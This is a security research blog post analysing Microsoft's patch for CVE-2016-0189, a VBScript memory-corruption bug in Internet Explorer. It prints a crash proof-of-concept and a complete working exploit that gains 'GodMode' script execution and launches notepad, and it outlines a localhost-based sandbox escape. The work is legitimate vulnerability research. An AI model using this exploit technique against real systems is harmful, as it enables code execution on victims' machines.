---
layout: post
title: "Patch Analysis of CVE-2016-0189"
description:
headline:
modified: 2016-06-22
category: research
imagefeature:
mathjax:
chart:
comments: true
featured: true
---

Last month, Microsoft released the [MS16-051][ms16-051]{:target="_blank"} security bulletin for their monthly Patch Tuesday (May 2016) security updates. It addressed vulnerabilities that affected Internet Explorer, including the [Scripting Engine Memory Corruption Vulnerability][cve-2016-0189]{:target="_blank"} (CVE-2016-0189), which was used in targeted attacks in South Korea[[1][south-korea]{:target="_blank"}].

Today, we are going to analyze the patch, figure out what the vulnerability was, and finally construct a proof-of-concept exploit.


### Patched vs Unpatched

We used [BinDiff][bindiff]{:target="_blank"} to diff the patched and unpatched versions of `vbscript.dll`. Only a few functions were changed in this patch, as we can see in the screenshot below.

<img src="{{ site.url }}/images/2016-06-22/bindiff.png" style="display: block; margin: auto;">

<br>

The most suspicious change seems to be in `AccessArray` function. Let's examine that function in IDA:

<img src="{{ site.url }}/images/2016-06-22/access_array_april.png" style="width: 48%; border: 1px solid #ccc;"><img src="{{ site.url }}/images/2016-06-22/access_array_may.png" style="width: 49%; float: right; border: 1px solid #ccc;">
<center><strong>April vs. May</strong></center>

Notice the difference? The patch added the lock on the array before the code accesses it. Other than the code added to release the lock in error cases, no other modifications to this function were made.

Next thing to look at is security/safety policy related functions like `IsUnsafeAllowed`.

<img src="{{ site.url }}/images/2016-06-22/is_unsafe_allowed_april.png" style="display: block; margin: auto; border: 1px solid #ccc;">

<img src="{{ site.url }}/images/2016-06-22/is_unsafe_allowed_may.png" style="display: block; margin: auto; border: 1px solid #ccc;">
<center><strong>April vs. May</strong></center><br>

Again, it's quite obvious what changed here. Before the patch, `IsUnsafeAllowed` calls a function that always returns zero without examining the policies, whereas the patched code now calls a function pointer that's located at `QueryProtectedPolicyPtr`. The `InitializeProtectedPolicy` function initializes the function pointer using `GetProcAddress`.

<img src="{{ site.url }}/images/2016-06-22/initialize_protected_policy.png" style="display: block; margin: auto; border: 1px solid #ccc;">


### Analysis

We have identified two vulnerabilities that were fixed with this patch. Let's see if we can use them to craft an exploit.

#### Vulnerability #1 - Missing a SafeArray lock in AccessArray

Given the patch inserted code to lock the array, it means that the attacker could somehow modify the array in the middle of accessing it such that the assumptions about the array properties (such as `cDims` or `cbElements`) mismatch.

```cpp
...
  while ( 1 )
  {
    curVar = VAR::PvarCutAll(curVar_);
    if ( VT_I2 == curVar->vt )
    {
      v14 = curVar->iVal;
    }
    else if ( VT_I4 == curVar->vt )
    {
      v14 = curVar->lVal;
    }
    else
    {
      v22 = 0;
      v18 = rtVariantChangeTypeEx(curVar, &v22, 0x400, 2, 3u, v20, v21);
      if ( v18 < 0 )
        return CScriptRuntime::RecordHr(a4, v18, v19, v20, v21);
      v14 = v23;
    }
    v15 = v14 - v25->lLbound;                   // lLbound is always 0
    if ( v15 < 0 || v15 >= v25->cElements )
      return CScriptRuntime::RecordHr(a4, 0x8002000B, v25, v20, v21);
    numDim = (numDim - 1);
    idx = v15 + v11;
    if ( numDim <= 0 )
      break;
    ++v25;
    v11 = v25->cElements * idx;
    curVar_ = (a4 + 16);
    a4 = (a4 + 16);
  }
  *v24 = arr->pvData + idx * arr->cbElements;   // cbElements == 16
...
```

In the main loop, the code starts from the right-most dimension of the array indices and computes the data pointer given the indices. Note that if the variant type for the index is either _VT_I2_ or _VT_I4_, the values are read in straight as a short and a long, respectively. However, for any other variant types, `rtVariantChangeTypeEx` is called to evaluate the index. When given a javascript object to this function, it retrieves the value by eventually calling `valueOf` of the target object. By providing an object that has a `valueOf` function of our choice, we can run arbitrary vbscript or javascript code inside of `rtVariantChangeTypeEx`.

```javascript
// exploit & triggerBug are defined in vbscript
var o;
o = {"valueOf": function () {
        triggerBug();
        return 1;
    }};
setTimeout(function() {exploit(o);}, 50);
```

We can use this to resize the array we are currently indexing! For example, imagine we have a 2-D array with the following dimensions:

```vb
ReDim Preserve A(1, 2000)
```

Then, when we access the array like `A(1, 2)`, the `idx` in `AccessArray` function will be computed as _1 + (2 * (2 - 0))_, which is 5. This gets multiplied by `cbElements` which is always _sizeof(VARIANT) = 16_ because arrays in vbscript hold variants: 80. Finally this is added to the data pointer (_pvData_) to return the data pointed by `A(1, 2)`.

Normally this isn't an issue because the allocated buffer is about 16 * 2 * 2001 == 64032 bytes. However, this offset becomes out-of-bound if the buffer gets resized to a smaller one. In other words, we can access `A(1, 2)` when the array is defined as `A(1, 1)`.

By overlapping free'd memory after the array resize with our exploit string, we can craft vbscript strings and variants to achieve an out-of-bound read/write primitive. This allows us to get the address of an object, read memory at an address, and write memory at an address by repeatedly triggering the bug.


#### Vulnerability #2 - IsUnsafeAllowed bypass

Before the patch, `IsUnsafeAllowed` function would always return 1 because `COleScript::OnEnterBreakPoint` is a dummy function that always returns 0. With the patch, it is fixed to properly exeucte `QueryProtectedPolicy` if it is available on the system (only supported Windows 8.1 and above).

#### SafeMode bypass with vulnerability #1 & #2

Internet Explorer, by default, prevents running scripts that may be harmful to the system. It checks with `InSafeMode` function, where the safe mode flag is verified (default flag is 0xE) as well as the check for the unsafe extensions (such as "Shell.Application") happens. Fortunately, we know that `IsUnsafeAllowed` will always return true and we can change the value of the flag by exploiting vulnerability #1.

<img src="{{ site.url }}/images/2016-06-22/in_safe_mode.png" style="display: block; margin: auto; border: 1px solid #CCC">

However, this does not overcome the Protected Mode (sandbox) of the Internet Explorer. Look at **Exploit** section to see how to escape the sandbox and run code as _Medium_ integrity.


### Trigger PoC

The following example crashes Internet Explorer with an access violation due to accessing memory that is no longer valid. The size of the second dimension of the array is changed to a much smaller value in the middle of accessing the array.

```html
<html>
<meta http-equiv="x-ua-compatible" content="IE=10">
<body>
    <script type="text/vbscript">
        Dim aw

        Class ArrayWrapper
            Dim A()
            Private Sub Class_Initialize
                ReDim Preserve A(1, 20000)
            End Sub
            Public Sub Resize()
                ReDim Preserve A(1, 1)
            End Sub
        End Class

        Function crash (arg1)
            Set aw = New ArrayWrapper
            MsgBox aw.A(arg1, 20000)
        End Function

        Function triggerBug
            aw.Resize()
        End Function
    </script>

    <script type="text/javascript">
        alert(1);
        var o = {"valueOf": function () { triggerBug(); return 1; }};
        setTimeout(function() {crash(o);}, 50);
    </script>
</body>
</html>
```

<img src="{{ site.url }}/images/2016-06-22/vbscript_crash_poc.png" style="display: block; margin: auto; border: 1px solid #CCC">


### Exploit

Arbitrary read/write primitives are very powerful in exploitation. In order to make the exploit more readable, we made the operations into nice functions:

  - **getAddr**: Triggers the bug and "sprays" the object we want to get the address of, then searches in memory to find its address.
  - **leakMem**: Triggers the bug and reads the memory content at a given address.
  - **overwrite**: Triggers the bug and overwrites memory at a given address with `CSng(0)` (single-precision 0) variant -- suitable for our purpose to obtain "GodMode"[[2][godmode]{:target="_blank"}] by changing the flag to `0x04`.

With these operations, we can do the following:

  1. Create a (dummy) VBScriptClass instance.
  2. Get the address of the class instance.
  3. Leak CSession address from the class instance.
  4. Leak COleScript address from the CSession instance.
  5. Overwrite SafetyOption in COleScript

Here's the final exploit to gain the "GodMode" in Internet Explorer 11 on Windows 10:

```html
<html>
<head>
<meta http-equiv="x-ua-compatible" content="IE=10">
</head>
<body>
    <script type="text/vbscript">
        Dim aw
        Dim plunge(32)
        Dim y(32)
        prefix = "%u4141%u4141"
        d = prefix & "%u0016%u4141%u4141%u4141%u4242%u4242"
        b = String(64000, "D")
        c = d & b
        x = UnEscape(c)

        Class ArrayWrapper
            Dim A()
            Private Sub Class_Initialize
                ' 2x2000 elements x 16 bytes / element = 64000 bytes
                ReDim Preserve A(1, 2000)
            End Sub

            Public Sub Resize()
                ReDim Preserve A(1, 1)
            End Sub
        End Class

        Class Dummy
        End Class

        Function getAddr (arg1, s)
            aw = Null
            Set aw = New ArrayWrapper

            For i = 0 To 32
                Set plunge(i) = s
            Next

            Set aw.A(arg1, 2) = s

            Dim addr
            Dim i
            For i = 0 To 31
                If Asc(Mid(y(i), 3, 1)) = VarType(s) Then
                    addr = strToInt(Mid(y(i), 3 + 4, 2))
                End If
                y(i) = Null
            Next

            If addr = Null Then
                document.location.href = document.location.href
                Return
            End If

            getAddr = addr
        End Function

        Function leakMem (arg1, addr)
            d = prefix & "%u0008%u4141%u4141%u4141"
            c = d & intToStr(addr) & b
            x = UnEscape(c)

            aw = Null
            Set aw = New ArrayWrapper

            Dim o
            o = aw.A(arg1, 2)

            leakMem = o
        End Function

        Sub overwrite (arg1, addr)
            d = prefix & "%u400C%u0000%u0000%u0000"
            c = d & intToStr(addr) & b
            x = UnEscape(c)

            aw = Null
            Set aw = New ArrayWrapper

            ' Single has vartype of 0x04
            aw.A(arg1, 2) = CSng(0)
        End Sub

        Function exploit (arg1)
            Dim addr
            Dim csession
            Dim olescript
            Dim mem

            ' Create a vbscript class instance
            Set dm = New Dummy
            ' Get address of the class instance
            addr = getAddr(arg1, dm)
            ' Leak CSession address from class instance
            mem = leakMem(arg1, addr + 8)
            csession = strToInt(Mid(mem, 3, 2))
            ' Leak COleScript address from CSession instance
            mem = leakMem(arg1, csession + 4)
            olescript = strToInt(Mid(mem, 1, 2))
            ' Overwrite SafetyOption in COleScript (e.g. god mode)
            ' e.g. changes it to 0x04 which is not in 0x0B mask
            overwrite arg1, olescript + &H174

            ' Execute notepad.exe
            Set Object = CreateObject("Shell.Application")
            Object.ShellExecute "notepad"
        End Function

        Function triggerBug
            ' Resize array we are currently indexing
            aw.Resize()

            ' Overlap freed array area with our exploit string
            Dim i
            For i = 0 To 32
                ' 24000x2 + 6 = 48006 bytes
                y(i) = Mid(x, 1, 24000)
            Next
        End Function
    </script>

    <script type="text/javascript">
        function strToInt(s)
        {
            return s.charCodeAt(0) | (s.charCodeAt(1) << 16);
        }
        function intToStr(x)
        {
            return String.fromCharCode(x & 0xffff) + String.fromCharCode(x >> 16);
        }
        var o;
        o = {"valueOf": function () {
                triggerBug();
                return 1;
            }};
        setTimeout(function() {exploit(o);}, 50);
    </script>
</body>
</html>
```

Obligatory screenshot:

<img src="{{ site.url }}/images/2016-06-22/notepad_screenshot.png" style="display: block; margin: auto; border: 1px solid #CCC">

Are we all done now? Unfortunately, no.

Some of you may wonder why we don't pop up a _calc.exe_ like others. It isn't because we wanted to be unique. The reason is that even with the SafeMode bypass, the Protected Mode (sandbox) filters what things are allowed to be executed (via WinExec or CreateProcess) from the Internet Explorer process.

Under _HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Low Rights\ElevationPolicy_, there are bunch of registry keys with values that describe the elevation policy that the Protected Mode should follow for a specific broker. You can read more about Protected Mode and its policies [here][elebp]{:target="_blank"}. Important bit here is that the list does not have any rule specified for _calc.exe_, which means that the default policy will be applied -- prompt the user for permission before spawning a Medium integrity process.

<img src="{{ site.url }}/images/2016-06-22/notepad_cmd.png" style="display: block; margin: auto; border: 1px solid #CCC">

<img src="{{ site.url }}/images/2016-06-22/elevation_policy.png" style="display: block; margin: auto">

Starting with Windows 8.1, the calculator app is _Modern_ and runs under AppContainer, but we can still test this by trying to spawn _wordpad.exe_ (which is not listed under the policy registry).

<img src="{{ site.url }}/images/2016-06-22/wordpad_prompt.png" style="display: block; margin: auto">

Only when the user clicks "Allow", it spawns the Wordpad application under Medium integrity.

<img src="{{ site.url }}/images/2016-06-22/wordpad_medium.png" style="display: block; margin: auto">

While the above proof-of-concept exploit proves that we can get unsafe vbscript code execution, just being able to run Medium integrity "notepad" isn't all that useful.

So, is there a way to get arbitrary code execution on the system with Medium integrity?

A couple years ago, Zero Day Initiative reported [this bug][zdi-14-270]{:target="_blank"} to Microsoft which did "not meet the bar for security servicing" according to the vendor. We can still use this trick to get arbitrary code execution as Medium integrity process from a Protected Mode process. The concept is well described in ZDI's blog [post][zdi-blog-post]{:target="_blank"}, but the basic idea is to open up a local server from the Low integrity IE process that serves the second stage exploit. Due to Internet Explorer's default behavior where the Intranet is trusted and _localhost_ is part of the Intranet, it spawns Medium integrity process for the tab browsing _localhost_. Then, we can exploit the same vulnerability to get script/code execution but this time under Medium integrity.

<img src="{{ site.url }}/images/2016-06-22/zdi_blog_image.png" style="display: block; margin: auto; border: 1px solid #CCC;">
<center style="font-size: 0.9em; margin-top:0; color: #666">ZDI-14-270 (from ZDI blog)</center><br>

We used some parts from [this PoC][sandbox-poc]{:target="_blank"} to demonstrate the sandbox escape.

You can find our final exploit code and files in our GitHub repo: [https://github.com/theori-io/cve-2016-0189][theori-github]{:target="_blank"}

<img src="{{ site.url }}/images/2016-06-22/cmd_screenshot.png" style="display: block; margin: auto; border: 1px solid #CCC">

We hope you enjoyed reading about constructing a "1-day" exploit from security patches. It is definitely a fun exercise to do, and sometimes gives you an insight about bugs & bug types that you haven't looked at or considered.

We will talk about another IE bug that was patched last week next time. Stay tuned for a jscript bug and exploitation!

Thanks for reading :)


[ms16-051]: https://technet.microsoft.com/en-us/library/security/ms16-051.aspx
[cve-2016-0189]: http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0189
[south-korea]: http://www.symantec.com/connect/blogs/internet-explorer-zero-day-exploit-used-targeted-attacks-south-korea
[bindiff]: https://www.zynamics.com/bindiff.html
[godmode]: http://blog.trendmicro.com/trendlabs-security-intelligence/a-killer-combo-critical-vulnerability-and-godmode-exploitation-on-cve-2014-6332/
[elebp]: https://msdn.microsoft.com/en-us/library/bb250462%28v=vs.85%29.aspx?f=255&MSPPError=-2147217396#wpm_elebp
[zdi-14-270]: http://zerodayinitiative.com/advisories/ZDI-14-270/
[zdi-blog-post]: http://community.hpe.com/t5/Security-Research/There-s-No-Place-Like-Localhost-A-Welcoming-Front-Door-To-Medium/ba-p/6560786#.V2m7-pMrIo_
[sandbox-poc]: https://gist.github.com/worawit/1213febe36aa8331e092
[theori-github]: https://github.com/theori-io/cve-2016-0189
